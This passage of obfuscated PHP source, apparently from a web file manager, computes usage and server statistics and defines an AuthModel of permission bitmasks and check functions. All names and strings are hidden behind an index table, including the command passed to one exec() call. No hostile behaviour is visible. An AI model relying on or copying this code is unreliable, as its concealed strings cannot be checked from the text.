$_SERVER[ˆ¡¹µ‹Â]; $çµÖæí = strtotime(date($ıŒĞËÊ½[1902], strtotime($ÏÁ×Ü))); $ÇøûæÔš = strtotime(date($ıŒĞËÊ½[1903], strtotime($ÏÁ×Ü))); $İº¾Å‘´ = array($ıŒĞËÊ½[231] => array($ıŒĞËÊ½[1084], $ÇøûæÔš)); $İ±ÔÅÜ© = Model($ıŒĞËÊ½[598])->where($İº¾Å‘´)->count($ıŒĞËÊ½[1763]); $İº¾Å‘´[$ıŒĞËÊ½[231]] = array($ıŒĞËÊ½[409], array($çµÖæí, $ÇøûæÔš)); $ùÀ‹¥¡Û = Model($ıŒĞËÊ½[598])->where($İº¾Å‘´)->count($ıŒĞËÊ½[1763]); $İº¾Å‘´[$ıŒĞËÊ½[33]] = $ıŒĞËÊ½[1904]; $ı¼ªÀÙ² = Model($ıŒĞËÊ½[1905])->where($İº¾Å‘´)->count($ıŒĞËÊ½[1906]); $”œâöäˆ = array($ıŒĞËÊ½[255] => $ÏÁ×Ü, $ıŒĞËÊ½[832] => (int) $İ±ÔÅÜ©, $ıŒĞËÊ½[1891] => (int) $ùÀ‹¥¡Û, $ıŒĞËÊ½[1892] => (int) $ı¼ªÀÙ²); return $this->insert($”œâöäˆ); } public function _recordStore($ØïÍãáŠ = '') { $úààúó° =& $_SERVER[ˆ¡¹µ‹Â]; $ø‡¯†µ· = strtotime(date($úààúó°[1903], strtotime($ØïÍãáŠ))); $ÔµÊıÔ™ = array($úààúó°[231] => array($úààúó°[1084], $ø‡¯†µ·)); $…ûãÛœ… = Model($úààúó°[544])->where($ÔµÊıÔ™)->sum($úààúó°[79]); $ÔµÊıÔ™[$úààúó°[485]] = 0; $ŠÃ©³é = Model($úààúó°[899])->where($ÔµÊıÔ™)->sum($úààúó°[79]); $ÔµÊıÔ™[$úààúó°[190]] = 1; $†øÈ¥¼É = Model($úààúó°[899])->where($ÔµÊıÔ™)->sum($úààúó°[79]); $ÔµÊıÔ™[$úààúó°[190]] = 2; $á¦ü¨¥­ = Model($úààúó°[899])->where($ÔµÊıÔ™)->sum($úààúó°[79]); $¿á‘‡ë» = array($úààúó°[255] => $ØïÍãáŠ, $úààúó°[830] => (int) $ŠÃ©³é, $úààúó°[1895] => (int) $…ûãÛœ…, $úààúó°[1896] => (int) $†øÈ¥¼É, $úààúó°[1897] => (int) $á¦ü¨¥­); return $this->insert($¿á‘‡ë»); } public function trend($Ìù§©óø, $›ÜôŞôå) { $×Ç¶ğ³Ğ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->init($Ìù§©óø)) { return !1; } $ø—ïğ = $this->trendList($Ìù§©óø); if ($ø—ïğ && $›ÜôŞôå != $×Ç¶ğ³Ğ[1736]) { $ó±Ç¬ÀÂ = $ø—ïğ[0][$×Ç¶ğ³Ğ[255]]; $¾ìò¹òÑ = $this->validDate($›ÜôŞôå, $ó±Ç¬ÀÂ); $“á¹åÓô = array(); $‰Èê˜²¹ = array_to_keyvalue($ø—ïğ, $×Ç¶ğ³Ğ[255]); foreach ($¾ìò¹òÑ as $³»ÜáĞÅ) { if (isset($‰Èê˜²¹[$³»ÜáĞÅ])) { $ÙßÒñÒ = $‰Èê˜²¹[$³»ÜáĞÅ]; } else { $ÙßÒñÒ = end($ø—ïğ); $ÙßÒñÒ[$×Ç¶ğ³Ğ[255]] = $³»ÜáĞÅ; if ($Ìù§©óø == $×Ç¶ğ³Ğ[662]) { $ÙßÒñÒ[$×Ç¶ğ³Ğ[1891]] = $ÙßÒñÒ[$×Ç¶ğ³Ğ[1892]] = 0; } } $“á¹åÓô[] = $ÙßÒñÒ; } $ø—ïğ = $“á¹åÓô; } $¨éÜíŠ´ = array($×Ç¶ğ³Ğ[662] => array($×Ç¶ğ³Ğ[832] => LNG($×Ç¶ğ³Ğ[1907]), $×Ç¶ğ³Ğ[1891] => LNG($×Ç¶ğ³Ğ[1908]), $×Ç¶ğ³Ğ[1892] => LNG($×Ç¶ğ³Ğ[1909])), $×Ç¶ğ³Ğ[1893] => array($×Ç¶ğ³Ğ[830] => LNG($×Ç¶ğ³Ğ[1910]), $×Ç¶ğ³Ğ[1895] => LNG($×Ç¶ğ³Ğ[1911]), $×Ç¶ğ³Ğ[1896] => LNG($×Ç¶ğ³Ğ[1912]), $×Ç¶ğ³Ğ[1897] => LNG($×Ç¶ğ³Ğ[1913]))); $ £ş‘¾ = array($×Ç¶ğ³Ğ[662] => $×Ç¶ğ³Ğ[1914], $×Ç¶ğ³Ğ[1893] => $×Ç¶ğ³Ğ[79]); if (empty($ø—ïğ)) { $³»ÜáĞÅ = date($×Ç¶ğ³Ğ[1898], strtotime($×Ç¶ğ³Ğ[1899])); $÷²Â—œ³ = array($×Ç¶ğ³Ğ[255] => $³»ÜáĞÅ); foreach ($¨éÜíŠ´[$Ìù§©óø] as $ºÆ¬°† => $½ÙÎ¥˜³) { $÷²Â—œ³[$ºÆ¬°†] = 0; } $ø—ïğ[] = $÷²Â—œ³; } $ÉÄÕº„ô = array(); foreach ($ø—ïğ as $½ÙÎ¥˜³) { if ($Ìù§©óø == $×Ç¶ğ³Ğ[1893] && $½ÙÎ¥˜³[$×Ç¶ğ³Ğ[1895]] > $½ÙÎ¥˜³[$×Ç¶ğ³Ğ[830]]) { $½ÙÎ¥˜³[$×Ç¶ğ³Ğ[1895]] = $½ÙÎ¥˜³[$×Ç¶ğ³Ğ[830]]; } foreach ($¨éÜíŠ´[$Ìù§©óø] as $ºÆ¬°† => $‚Íî¾€¯) { $ÙßÒñÒ = array($×Ç¶ğ³Ğ[255] => $½ÙÎ¥˜³[$×Ç¶ğ³Ğ[255]], $×Ç¶ğ³Ğ[1652] => $‚Íî¾€¯); $ÙßÒñÒ[$ £ş‘¾[$Ìù§©óø]] = isset($½ÙÎ¥˜³[$ºÆ¬°†]) ? $½ÙÎ¥˜³[$ºÆ¬°†] : 0; $ÉÄÕº„ô[] = $ÙßÒñÒ; } } return $ÉÄÕº„ô; } public function validDate($İÔ‰äÆ‡, $öŞÌ¯¢ô) { $³­’ö =& $_SERVER[ˆ¡¹µ‹Â]; $İ·¨¡‰£ = date($³­’ö[1898], strtotime($³­’ö[1899])); $ÛÓ¥¸“¸ = array($İ·¨¡‰£); switch ($İÔ‰äÆ‡) { case $³­’ö[1743]: $ğ–í·» = mktime(0, 0, 0, date($³­’ö[1915]), date($³­’ö[1442]) - date($³­’ö[1532]) + 7 - 7, date($³­’ö[1916])); $Œ±À—Ç† = 0; do { $Ùè®Îõ‘ = date($³­’ö[1898], $ğ–í·» - 3600 * 24 * 7 * $Œ±À—Ç†); $ÛÓ¥¸“¸[] = $Ùè®Îõ‘; $Œ±À—Ç†++; } while ($öŞÌ¯¢ô < $Ùè®Îõ‘); break; case $³­’ö[1741]: $Œ±À—Ç† = 1; do { $«÷³åÙ÷ = date($³­’ö[1917], strtotime("\55\40{$Œ±À—Ç†}\x20\155\x6f\x6e\164\x68\x73")); $ÛÓ¥¸“¸[] = $«÷³åÙ÷; $Œ±À—Ç†++; } while ($öŞÌ¯¢ô < $«÷³åÙ÷); break; case $³­’ö[1918]: $ÖØÇ“”® = (int) date($³­’ö[1916], strtotime($öŞÌ¯¢ô)); $¸Ò”»ä = (int) date($³­’ö[1916]); if ($ÖØÇ“”® >= $¸Ò”»ä) { break; } for ($ÖØÇ“”®; $ÖØÇ“”® < $¸Ò”»ä; $ÖØÇ“”®++) { $ÛÓ¥¸“¸[] = $ÖØÇ“”® . $³­’ö[1919]; } break; default: break; } if ($öŞÌ¯¢ô > end($ÛÓ¥¸“¸)) { array_pop($ÛÓ¥¸“¸); } sort($ÛÓ¥¸“¸); return $ÛÓ¥¸“¸; } public function listTable($šµÆ›Ó) { $ğ¨öı¥ = ucfirst($šµÆ›Ó); return Model($ğ¨öı¥)->listData(); } public function option($ØŸ³¤úı) { $ˆ¸•¿°Ú = $_SERVER[ˆ¡¹µ‹Â][1920] . ucfirst($ØŸ³¤úı); return $this->{$ˆ¸•¿°Ú}(); } private function optionUser() { $Å“µ –Î =& $_SERVER[ˆ¡¹µ‹Â]; $çùÉµí… = Model($Å“µ –Î[598])->count($Å“µ –Î[1763]); $¼èÁ» = Model($Å“µ –Î[598])->where($Å“µ –Î[1921])->count($Å“µ –Î[1763]); $»ÓÂ÷éƒ = intval($GLOBALS[$Å“µ –Î[6]][$Å“µ –Î[425]][$Å“µ –Î[1709]]) / 3600; $õ—‚—™Î = strtotime("\55{$»ÓÂ÷éƒ}\x20\150\x6f\x75\162\x73"); $ÉÔ…š¥ˆ = strtotime(date($Å“µ –Î[1902])); if ($õ—‚—™Î < $ÉÔ…š¥ˆ) { $õ—‚—™Î = $ÉÔ…š¥ˆ; } $â‘‚ŸÁ‹ = array($Å“µ –Î[1922] => array($Å“µ –Î[1085], $õ—‚—™Î)); $Ş¥ö“² = (int) Model($Å“µ –Î[598])->where($â‘‚ŸÁ‹)->count($Å“µ –Î[1763]); if (!$Ş¥ö“²) { $Ş¥ö“² = 1; } $â‘‚ŸÁ‹ = array($Å“µ –Î[1922] => array($Å“µ –Î[1085], $ÉÔ…š¥ˆ)); $‡Œßçã = Model($Å“µ –Î[598])->where($â‘‚ŸÁ‹)->count($Å“µ –Î[1763]); return array($Å“µ –Î[825] => (int) $çùÉµí…, $Å“µ –Î[1923] => (int) ($çùÉµí… - $¼èÁ»), $Å“µ –Î[1924] => (int) $¼èÁ», $Å“µ –Î[1925] => (int) $‡Œßçã, $Å“µ –Î[1926] => $Ş¥ö“²); } private function optionFile() { $Î—ÒÛ =& $_SERVER[ˆ¡¹µ‹Â]; $§à¡ÒÇÑ = $this->sourceSize(); $³é§—¾ = $§à¡ÒÇÑ[$Î—ÒÛ[79]]; $–Û•‡»ğ = $§à¡ÒÇÑ[$Î—ÒÛ[1895]]; $İï‰ü¸À = Model($Î—ÒÛ[899])->where(array($Î—ÒÛ[485] => 0))->count($Î—ÒÛ[193]); $•¼öú€„ = array($Î—ÒÛ[485] => 0, $Î—ÒÛ[231] => array($Î—ÒÛ[1085], strtotime(date($Î—ÒÛ[1902])))); $Ç„«®ÉÇ = Model($Î—ÒÛ[899])->where($•¼öú€„)->sum($Î—ÒÛ[79]); $Œáùìè¯ = Model($Î—ÒÛ[899])->where($•¼öú€„)->count($Î—ÒÛ[193]); return array($Î—ÒÛ[830] => $³é§—¾, $Î—ÒÛ[1895] => $–Û•‡»ğ, $Î—ÒÛ[1927] => $³é§—¾ - $–Û•‡»ğ, $Î—ÒÛ[1928] => (int) $Ç„«®ÉÇ, $Î—ÒÛ[832] => (int) $İï‰ü¸À, $Î—ÒÛ[1929] => (int) $Œáùìè¯); } private function optionAccess() { $àˆõ°¢€ =& $_SERVER[ˆ¡¹µ‹Â]; return array($àˆõ°¢€[825] => $this->typeLogCnt(), $àˆõ°¢€[110] => $this->typeLogCnt($àˆõ°¢€[110]), $àˆõ°¢€[525] => $this->typeLogCnt($àˆõ°¢€[525]), $àˆõ°¢€[1930] => $this->typeLogCnt($àˆõ°¢€[1930]), $àˆõ°¢€[1931] => $this->typeLogCnt($àˆõ°¢€[1931]), $àˆõ°¢€[662] => $this->typeLogCnt($àˆõ°¢€[12], $àˆõ°¢€[1906])); } private function typeLogCnt($©¬æÑÎ‹ = '', $ğ•„‡ñó = "\x69\x64") { $ó‡Ô›ñ =& $_SERVER[ˆ¡¹µ‹Â]; $Ö¶õıõ¦ = array($ó‡Ô›ñ[110] => array($ó‡Ô›ñ[1932], $ó‡Ô›ñ[1933]), $ó‡Ô›ñ[525] => array($ó‡Ô›ñ[1934], $ó‡Ô›ñ[1935]), $ó‡Ô›ñ[1930] => array($ó‡Ô›ñ[1936], $ó‡Ô›ñ[1937], $ó‡Ô›ñ[1938]), $ó‡Ô›ñ[1931] => array($ó‡Ô›ñ[1939], $ó‡Ô›ñ[1940]), $ó‡Ô›ñ[1941] => array($ó‡Ô›ñ[1942], $ó‡Ô›ñ[1943], $ó‡Ô›ñ[1944])); $Ìûı¸¹ı = strtotime(date($ó‡Ô›ñ[1902])); $†Ä€Ò¼ô = array($ó‡Ô›ñ[231] => array($ó‡Ô›ñ[1085], $Ìûı¸¹ı)); if ($©¬æÑÎ‹) { $†Ä€Ò¼ô[$ó‡Ô›ñ[33]] = array($ó‡Ô›ñ[7], $Ö¶õıõ¦[$©¬æÑÎ‹]); } $‚•æ¿ƒ³ = Model($ó‡Ô›ñ[1905])->where($†Ä€Ò¼ô)->count($ğ•„‡ñó); return (int) $‚•æ¿ƒ³; } private function optionServer() { $ıç¦”†¦ =& $_SERVER[ˆ¡¹µ‹Â]; $ÉœĞŞ = $this->diskDriver(); $×òÕÍşù = KodIO::defaultDriver(); $Í½²³ª× = array($ıç¦”†¦[892] => $×òÕÍşù[$ıç¦”†¦[475]]); $ÚÈÁÈÎğ = Model($ıç¦”†¦[544])->where($Í½²³ª×)->sum($ıç¦”†¦[79]); $ëáÈğÉ = explode($ıç¦”†¦[53], $_SERVER[$ıç¦”†¦[147]]); $ùÇ›Ìä¦ = $ëáÈğÉ[0]; $æàˆ ’Ù = $GLOBALS[$ıç¦”†¦[6]][$ıç¦”†¦[21]]; $õÅş¯ûá = $æàˆ ’Ù[$ıç¦”†¦[1047]]; if ($õÅş¯ûá == $ıç¦”†¦[1035]) { $Ô„¼›¦Ç = explode($ıç¦”†¦[1361], $æàˆ ’Ù[$ıç¦”†¦[1046]]); $õÅş¯ûá = $Ô„¼›¦Ç[0]; } if ($õÅş¯ûá == $ıç¦”†¦[983] || $õÅş¯ûá == $ıç¦”†¦[879]) { $ÇÙÏ×­ = Model()->db()->query($ıç¦”†¦[1945]); $±­ªÌ‚  = $ÇÙÏ×­[0] && isset($ÇÙÏ×­[0][$ıç¦”†¦[1651]]) ? $ÇÙÏ×­[0][$ıç¦”†¦[1651]] : 0; $õÅş¯ûá = $ıç¦”†¦[1946] . ($±­ªÌ‚  ? $ıç¦”†¦[8] . $±­ªÌ‚  : $ıç¦”†¦[12]); } $ÔˆéÂÓì = $GLOBALS[$ıç¦”†¦[6]][$ıç¦”†¦[425]][$ıç¦”†¦[901]]; return array($ıç¦”†¦[1947] => $ÉœĞŞ ? $ÉœĞŞ[$ıç¦”†¦[1948]] : 0, $ıç¦”†¦[1949] => $ÉœĞŞ ? $ÉœĞŞ[$ıç¦”†¦[1950]] : 0, $ıç¦”†¦[1951] => (int) $×òÕÍşù[$ıç¦”†¦[1948]] * 1024 * 1024 * 1024, $ıç¦”†¦[1952] => (int) $ÚÈÁÈÎğ, $ıç¦”†¦[1953] => ucfirst($ùÇ›Ìä¦), $ıç¦”†¦[1954] => $ıç¦”†¦[1955] . PHP_VERSION, $ıç¦”†¦[1956] => phpBuild64() ? 64 : 32, $ıç¦”†¦[824] => str_replace($ıç¦”†¦[1204], $ıç¦”†¦[1063], $õÅş¯ûá), $ıç¦”†¦[425] => ucfirst($ÔˆéÂÓì), $ıç¦”†¦[32] => $_SERVER[$ıç¦”†¦[1957]]); } private function diskDriver() { $àŒß¯¿ë =& $_SERVER[ˆ¡¹µ‹Â]; $ã¤‹ßéö = $àŒß¯¿ë[8]; $ù“¯‡§Í = $GLOBALS[$àŒß¯¿ë[6]][$àŒß¯¿ë[1378]] == $àŒß¯¿ë[1379]; if ($ù“¯‡§Í) { $ã¤‹ßéö = $àŒß¯¿ë[1958]; if (function_exists($àŒß¯¿ë[1959])) { exec($àŒß¯¿ë[1960], $¡»ÎØ™); $ã¤‹ßéö = $¡»ÎØ™[1] . $àŒß¯¿ë[8]; } } if (!file_exists($ã¤‹ßéö)) { return; } if (!function_exists($àŒß¯¿ë[1961])) { return; } $İÒ¬áÎ = @disk_total_space($ã¤‹ßéö); $¶ËâÛìã = $İÒ¬áÎ - @disk_free_space($ã¤‹ßéö); return array($àŒß¯¿ë[1948] => $İÒ¬áÎ, $àŒß¯¿ë[1950] => $¶ËâÛìã); } public function fileChart($…âÇæºŸ) { $·ÊœÇÈµ =& $_SERVER[ˆ¡¹µ‹Â]; if (isset($…âÇæºŸ[$·ÊœÇÈµ[1763]])) { return Model($·ÊœÇÈµ[899])->userFileTypeProfile($…âÇæºŸ[$·ÊœÇÈµ[1763]]); } if (isset($…âÇæºŸ[$·ÊœÇÈµ[1962]])) { return Model($·ÊœÇÈµ[899])->groupFileTypeProfile($…âÇæºŸ[$·ÊœÇÈµ[1962]]); } $¡ñÙÓˆ = $this->sourceSize(); $“Ú–İ’ş = array($·ÊœÇÈµ[192] => 0, $·ÊœÇÈµ[190] => 1); $´éˆÛ’Å = Model($·ÊœÇÈµ[899])->where($“Ú–İ’ş)->sum($·ÊœÇÈµ[79]); $“Ú–İ’ş[$·ÊœÇÈµ[190]] = 2; $…€ÚÍ’ª = Model($·ÊœÇÈµ[899])->where($“Ú–İ’ş)->sum($·ÊœÇÈµ[79]); return array($·ÊœÇÈµ[830] => $¡ñÙÓˆ[$·ÊœÇÈµ[79]], $·ÊœÇÈµ[1895] => $¡ñÙÓˆ[$·ÊœÇÈµ[1895]], $·ÊœÇÈµ[1896] => (int) $´éˆÛ’Å, $·ÊœÇÈµ[1897] => (int) $…€ÚÍ’ª); } private function sourceSize() { $–È÷ÏÅ§ =& $_SERVER[ˆ¡¹µ‹Â]; $¢‡ß™ÓÅ = Model($–È÷ÏÅ§[899])->where(array($–È÷ÏÅ§[485] => 0))->sum($–È÷ÏÅ§[79]); $öúÌÏ· = Model($–È÷ÏÅ§[544])->sum($–È÷ÏÅ§[79]); if ($öúÌÏ· > $¢‡ß™ÓÅ) { $öúÌÏ· = $¢‡ß™ÓÅ; } return array($–È÷ÏÅ§[79] => (int) $¢‡ß™ÓÅ, $–È÷ÏÅ§[1895] => (int) $öúÌÏ·); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ÂœÀµ§ =& $_SERVER[ˆ¡¹µ‹Â]; $íÏÜåˆ¢ = array(array($ÂœÀµ§[494] => LNG($ÂœÀµ§[1963]), $ÂœÀµ§[1964] => $ÂœÀµ§[1965], $ÂœÀµ§[1966] => 1, $ÂœÀµ§[1967] => 1, $ÂœÀµ§[1968] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÂœÀµ§[494] => LNG($ÂœÀµ§[1969]), $ÂœÀµ§[1964] => $ÂœÀµ§[1970], $ÂœÀµ§[1966] => 2, $ÂœÀµ§[1967] => 1, $ÂœÀµ§[1968] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÂœÀµ§[494] => LNG($ÂœÀµ§[1971]), $ÂœÀµ§[1964] => $ÂœÀµ§[1972], $ÂœÀµ§[1966] => 3, $ÂœÀµ§[1967] => 1, $ÂœÀµ§[1968] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÂœÀµ§[494] => LNG($ÂœÀµ§[1973]), $ÂœÀµ§[1964] => $ÂœÀµ§[1974], $ÂœÀµ§[1966] => 4, $ÂœÀµ§[1967] => 1, $ÂœÀµ§[1968] => self::AUTH_SHOW | self::AUTH_VIEW), array($ÂœÀµ§[494] => LNG($ÂœÀµ§[1975]), $ÂœÀµ§[1964] => $ÂœÀµ§[1976], $ÂœÀµ§[1966] => 5, $ÂœÀµ§[1967] => 1, $ÂœÀµ§[1968] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ÂœÀµ§[494] => LNG($ÂœÀµ§[1977]), $ÂœÀµ§[1964] => $ÂœÀµ§[1978], $ÂœÀµ§[1966] => 6, $ÂœÀµ§[1967] => 1, $ÂœÀµ§[1968] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ÂœÀµ§[494] => LNG($ÂœÀµ§[1979]), $ÂœÀµ§[1964] => $ÂœÀµ§[1980], $ÂœÀµ§[1966] => 7, $ÂœÀµ§[1967] => 1, $ÂœÀµ§[1968] => 0)); return $íÏÜåˆ¢; } public static function authCheck($¬Õø°èÖ, $„°Õ‰ïÄ) { $Ï…Ç¶±ô =& $_SERVER[ˆ¡¹µ‹Â]; $¬Õø°èÖ = intval($¬Õø°èÖ); if (KodUser::isRoot() && $GLOBALS[$Ï…Ç¶±ô[6]][$Ï…Ç¶±ô[1981]]) { return !0; } if ($¬Õø°èÖ <= 0) { return !1; } if (($¬Õø°èÖ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¬Õø°èÖ & $„°Õ‰ïÄ); } public static function authCheckShow($çËú„ëÂ) { return self::authCheck($çËú„ëÂ, self::AUTH_SHOW); } public static function authCheckView($ÕÆ•“ªş) { return self::authCheck($ÕÆ•“ªş, self::AUTH_VIEW); } public static function authCheckDownload($¯ğÂÒÁ) { return self::authCheck($¯ğÂÒÁ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($¸½’…·†) { return self::authCheck($¸½’…·†, self::AUTH_UPLOAD); } public static function authCheckEdit($ƒ¡£¢€¢) { return self::authCheck($ƒ¡£¢€¢, self::AUTH_EDIT); } public static function authCheckRemove($à’™†ãÁ) { return self::authCheck($à’™†ãÁ, self::AUTH_REMOVE); } public static function authCheckShare($Îå†¯Ø) { return self::authCheck($Îå†¯Ø, self::AUTH_SHARE); } public static function authCheckComment($±ıİ›â) { return self::authCheck($±ıİ›â, self::AUTH_COMMENT); } public static function authCheckEvent($¤µòïÁ’) { return self::authCheck($¤µòïÁ’, self::AUTH_EVENT); } public static function authCheckRoot($š¯¸‘¢Á) { return self::authCheck($š¯¸‘¢Á, self::AUTH_ROOT); } public static function authCheckAction($Û…øÊ·Ğ, $şúìë¿¥) { $‚¸æ¬û² =& $_SERVER[ˆ¡¹µ‹Â]; $³‘•İÌö = array($‚¸æ¬û²[1982] => self::AUTH_VIEW, $‚¸æ¬û²[1272] => self::AUTH_DOWNLOAD, $‚¸æ¬û²[110] => self::AUTH_UPLOAD, $‚¸æ¬û²[1931] => self::AUTH_EDIT, $‚¸æ¬û²[1930] => self::AUTH_REMOVE, $‚¸æ¬û²[1941] => self::AUTH_SHARE, $‚¸æ¬û²[430] => self::AUTH_COMMENT, $‚¸æ¬û²[1751] => self::AUTH_EVENT, $‚¸æ¬û²[1983] => self::AUTH_ROOT); if (!isset($³‘•İÌö[$şúìë¿¥])) { return; } $ıÈ¾ƒƒ = $³‘•İÌö[$şúìë¿¥]; $Û…øÊ·Ğ = intval($Û…øÊ·Ğ); if ($Û…øÊ·Ğ <= 0) { return !1; } if (($Û…øÊ·Ğ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Û…øÊ·Ğ & $ıÈ¾ƒƒ); } public static function authDisable($İ­ûì´, $å½ìê³ö) { if (intval($İ­ûì´) <= 0) { return 0; } return intval($İ­ûì´) & ~$å½ìê³ö; } public $optionType = "\x53\x79\x73\x74\x65\155\x2e\x73\x6f\x75\162\143\145\101\x75\164\150\114\151\x73\x74"; public $field = array("\x6e\x61\155\145", "\x61\x75\x74\150", "\154\x61\142\x65\154", "\x64\x69\163\160\x6c\141\x79", "\x73\171\x73\164\145\155", "\x73\157\162\x74"); public function initData() { $İ‹“¢ß = $this->authDefault(); foreach ($İ‹“¢ß as $û®ÈçÑœ) { $this->add($û®ÈçÑœ); } } public function findAuth($±ªëªé, $¶©æÊïµ) { $àìğç´ =& $_SERVER[ˆ¡¹µ‹Â]; $ÚµÇŞƒñ = parent::listData(); foreach ($ÚµÇŞƒñ as $—ÎİÁâ¡) { $Ãø…µ¦— = intval($—ÎİÁâ¡[$àìğç´[487]]); if ($Ãø…µ¦— <= 0 || $—ÎİÁâ¡[$àìğç´[1984]] == 0) { continue; } if (($Ãø…µ¦— & $±ªëªé) != $±ªëªé) { continue; } if (($Ãø…µ¦— & $¶©æÊïµ) != 0) { continue; } return $—ÎİÁâ¡[$àìğç´[475]]; } return !1; } public function findAuthMax($‰Ê²ù“Â, $ÄÍ×±“Õ) { $Ú¥ş”â÷ =& $_SERVER[ˆ¡¹µ‹Â]; $¥Ûœ“• = !1; $ò™â˜û£ = parent::listData(); foreach ($ò™â˜û£ as $Ëá×İ»•) { $ĞÒÎä¹ = intval($Ëá×İ»•[$Ú¥ş”â÷[487]]); if ($ĞÒÎä¹ <= 0 || $Ëá×İ»•[$Ú¥ş”â÷[1984]] == 0) { continue; } if (($ĞÒÎä¹ & $‰Ê²ù“Â) != $‰Ê²ù“Â) { continue; } if (($ĞÒÎä¹ & $ÄÍ×±“Õ) != 0) { continue; } if (!$¥Ûœ“•) { $¥Ûœ“• = $Ëá×İ»•; continue; } if (intval($¥Ûœ“•[$Ú¥ş”â÷[487]]) < $ĞÒÎä¹) { $¥Ûœ“• = $Ëá×İ»•; } } return $¥Ûœ“• ? $¥Ûœ“•[$Ú¥ş”â÷[475]] : !1; } public function findAuthReadOnly() { $–Ø¢Ÿ¥È = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $”ùó§ñ‡ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($–Ø¢Ÿ¥È, $”ùó§ñ‡); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ı”àƒ±ù =& $_SERVER[ˆ¡¹µ‹Â]; $æÊÍ­Èù = parent::listData(); $ò¬Ã–“ = !1; foreach ($æÊÍ­Èù as $ôç‰ÈÓ) { if ($ôç‰ÈÓ[$ı”àƒ±ù[487]] <= 0 || $ôç‰ÈÓ[$ı”àƒ±ù[1984]] == $ı”àƒ±ù[228]) { continue; } if (!$ò¬Ã–“) { $ò¬Ã–“ = $ôç‰ÈÓ; continue; } if ($ò¬Ã–“[$ı”àƒ±ù[487]] > $ôç‰ÈÓ[$ı”àƒ±ù[487]]) { $ò¬Ã–“ = $ôç‰ÈÓ; } } return $ò¬Ã–“ ? $ò¬Ã–“[$ı”àƒ±ù[475]] : $ı”àƒ±ù[12]; } public function listData($÷ôˆ¹º = false, $òì¡•–Ë = "\163\x6f\x72\164", $¡òœ¬ª = false) { return parent::listData($÷ôˆ¹º, $òì¡•–Ë, $¡òœ¬ª); } public function update($…ñ©ßâæ, $‚ŸÒŸÚÇ) { $§–Ğıá„ =& $_SERVER[ˆ¡¹µ‹Â]; $”µìºº§ = parent::listData($…ñ©ßâæ); $¦êÑäèƒ = $this->findByName($‚ŸÒŸÚÇ[$§–Ğıá„[32]]); if (!$”µìºº§ || $¦êÑäèƒ && $¦êÑäèƒ[$§–Ğıá„[475]] != $”µìºº§[$§–Ğıá„[475]]) { return !1; } $this->filterAuth($‚ŸÒŸÚÇ[$§–Ğıá„[487]]); return parent::update($…ñ©ßâæ, $‚ŸÒŸÚÇ); } public function remove($î¿ßú†ó) { $»¯¸˜ = parent::listData($î¿ßú†ó); if (!$»¯¸˜ || $»¯¸˜[$_SERVER[ˆ¡¹µ‹Â][191]]) { return !1; } return parent::remove($î¿ßú†ó); } public function add($‰¬öÜ = array()) { $ı¹Ø¼ç =& $_SERVER[ˆ¡¹µ‹Â]; if ($this->findByName($‰¬öÜ[$ı¹Ø¼ç[32]])) { return !1; } $éˆ‰ôŞ = array($ı¹Ø¼ç[32] => $ı¹Ø¼ç[12], $ı¹Ø¼ç[487] => 1, $ı¹Ø¼ç[1985] => $ı¹Ø¼ç[1972], $ı¹Ø¼ç[1984] => 1, $ı¹Ø¼ç[191] => 0, $ı¹Ø¼ç[1986] => 0); $‰¬öÜ = array_merge($éˆ‰ôŞ, $‰¬öÜ); $‰¬öÜ[$ı¹Ø¼ç[1986]] = $this->getSort(); $this->filterAuth($‰¬öÜ[$ı¹Ø¼ç[487]]); return parent::insert($‰¬öÜ); } private function getSort() { $Öå¬İË =& $_SERVER[ˆ¡¹µ‹Â]; $ğÉæË‘¸ = parent::listData(); $÷ÙôØ¿• = array_to_keyvalue($ğÉæË‘¸, $Öå¬İË[12], $Öå¬İË[1986]); return empty($÷ÙôØ¿•) ? 0 : max($÷ÙôØ¿•) + 1; } private function filterAuth(&$ŠÀï’Ÿ) { if (!$ŠÀï’Ÿ) { return; } $ìºàÕÇ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $­é£üßˆ = array(); foreach ($ìºàÕÇ as $Çğ±íÍ) { if ($ŠÀï’Ÿ & $Çğ±íÍ) { $­é£üßˆ[] = $Çğ±íÍ; } } if (in_array(self::AUTH_ROOT, $­é£üßˆ)) { $ŠÀï’Ÿ = array_sum($ìºàÕÇ); return; } $ÏÛö‰úØ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), 